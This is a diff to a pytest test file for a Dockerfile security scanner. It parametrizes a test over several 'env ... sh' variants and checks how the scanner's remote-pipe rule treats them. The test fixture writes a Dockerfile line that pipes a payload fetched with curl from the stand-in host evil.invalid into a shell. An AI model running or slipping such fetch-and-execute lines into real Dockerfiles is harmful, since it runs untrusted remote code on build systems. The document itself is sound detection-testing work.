@@ -134,10 +134,19 @@ def test_scan_tree_allows_non_combined_rm_cleanup(tmp_path: Path, command: str) 
     assert not any(finding.rule == "SEC_SHELL_RECURSIVE_DELETE" for finding in scan_tree(tmp_path))
 
 
-def test_scan_tree_treats_env_dash_after_assignment_as_command(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "shell",
+    (
+        "env CLEAN=1 - sh",
+        "env - -- sh",
+        "env - -i sh",
+        "env - - sh",
+    ),
+)
+def test_scan_tree_stops_env_option_parsing_at_command(tmp_path: Path, shell: str) -> None:
     dockerfile = tmp_path / "Dockerfile"
     dockerfile.write_text(
-        "FROM python:3.11\nRUN curl https://evil.invalid/payload | env CLEAN=1 - sh\n"
+        f"FROM python:3.11\nRUN curl https://evil.invalid/payload | {shell}\n"
     )
     assert not any(finding.rule == "SEC_SHELL_REMOTE_PIPE" for finding in scan_tree(tmp_path))
 
